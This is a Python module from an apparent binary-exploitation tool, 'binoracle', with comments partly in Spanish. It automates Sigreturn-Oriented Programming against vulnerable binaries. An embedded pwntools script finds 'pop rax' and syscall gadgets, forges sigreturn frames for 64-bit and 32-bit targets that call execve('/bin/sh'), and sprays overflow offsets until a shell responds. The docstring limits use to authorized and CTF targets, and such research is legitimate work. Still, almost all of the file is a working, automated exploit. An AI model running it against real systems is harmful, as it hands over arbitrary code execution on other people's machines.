"""SROP (Sigreturn-Oriented Programming): pop a shell with almost no gadgets.

A single `rt_sigreturn` syscall (RAX=15) makes the kernel restore the ENTIRE register set from a
sigcontext frame sitting on the stack. So with only `pop rax; ret` + a `syscall` gadget -- and no
`pop rdi/rsi/rdx` at all -- you forge a frame with RAX=59 (execve), RDI=&"/bin/sh", RSI=RDX=0 and
RIP=syscall, trigger sigreturn, and the kernel hands control to execve("/bin/sh",0,0). This is the
go-to technique for tiny / static binaries that are too gadget-poor for a normal ROP execve chain.

binoracle reasons about it when: an overflow controls RIP, there is a `syscall` gadget and a way to
set RAX (pop rax), and a "/bin/sh" string exists in the binary (or a writable region to stage one).
Verified by execution -- a real shell -- in the sandbox (Docker image or native fallback). For
AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, ROP, SigreturnFrame, process, context, p64, p32
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"
is32 = elf.bits == 32
context.arch = "i386" if is32 else "amd64"
rop = ROP(elf)
# a "/bin/sh" in the binary (data) -- SROP needs the string at a known fixed address (no-PIE)
binsh = next(elf.search(b"/bin/sh\x00"), None)
if binsh is None:
    print("NOT_APPLICABLE (no '/bin/sh' string in the binary)"); sys.exit(1)
MARK = b"BINORACLE_SROP_PWNED"

if is32:
    # x86-32: sigreturn is syscall 119 (0x77) via `int 0x80`; the restored frame runs execve
    # (eax=11) with ebx=&binsh, triggered by the frame's eip = int 0x80 gate.
    pop_ax = rop.find_gadget(["pop eax", "ret"])
    sc = rop.find_gadget(["int 0x80"])
    if not pop_ax or not sc:
        print("NOT_APPLICABLE (need pop eax; ret and an int 0x80 gadget)"); sys.exit(1)
    def frame_bytes():
        frame = SigreturnFrame(kernel="i386")   # i386 frame requires the kernel arch explicitly
        frame.eax = 0x0b; frame.ebx = binsh; frame.ecx = 0; frame.edx = 0
        frame.eip = sc.address
        # pwntools' i386 frame defaults to legacy LDT segments (cs=0x73, ss=0x7b, ds=0); modern
        # Linux i386 uses cs=0x23, ss/ds/es=0x2b, gs=0x63 -- without these the restored int 0x80
        # faults on instruction fetch (confirmed: exit(42) -> SIGSEGV vs exit 42 once fixed).
        frame.cs = 0x23; frame.ss = 0x2b; frame.ds = 0x2b; frame.es = 0x2b; frame.gs = 0x63; frame.fs = 0
        return bytes(frame)
    chain = p32(pop_ax.address) + p32(0x77) + p32(sc.address) + frame_bytes()  # EAX=119 (sigreturn)
    pop_rax = pop_ax                     # alias for the shared VERIFIED print below
else:
    pop_rax = rop.find_gadget(["pop rax", "ret"])
    sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
    if not pop_rax or not sc:
        print("NOT_APPLICABLE (need pop rax; ret and a syscall gadget)"); sys.exit(1)
    def frame_bytes():
        frame = SigreturnFrame()
        frame.rax = 0x3b                 # execve
        frame.rdi = binsh
        frame.rsi = 0
        frame.rdx = 0
        frame.rip = sc.address           # the restored RIP runs execve('/bin/sh', 0, 0)
        return bytes(frame)
    chain = p64(pop_rax.address) + p64(15) + p64(sc.address) + frame_bytes()  # RAX=15 (rt_sigreturn)
for off in [72, 76, 64, 88, 56, 96, 80, 104, 120, 40, 48, 112, 128, 136, 152, 168, 200]:
    io = None
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(b"A" * off + chain); time.sleep(0.3)
        io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
        out = b""
        try: out = io.recvrepeat(1.2)
        except Exception: pass
        io.close()
        if MARK in out or b"uid=" in out:
            print("VERIFIED off=%d rax_gadget=%#x syscall=%#x binsh=%#x"
                  % (off, pop_rax.address, sc.address, binsh))
            sys.exit(0)
    except Exception:
        try:
            if io: io.close()
        except Exception: pass
print("NOT_VERIFIED")
sys.exit(1)
'''


def autosrop(binary: str) -> dict:
    """SROP execve('/bin/sh') verificado por ejecucion. Necesita `pop rax; ret`, un gadget
    `syscall` y una cadena '/bin/sh' en el binario. Docker o sandbox nativo; degrada limpio."""
    res = run_driver(binary, _DRIVER, ".binoracle_srop.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"SROP (sigreturn -> execve): shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"SROP: no verificado ({eng}) (sin pop rax/syscall/'/bin/sh' o timing)")
    return res


def render_srop(r: dict) -> str:
    out = ["## Auto SROP (sigreturn -> execve, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
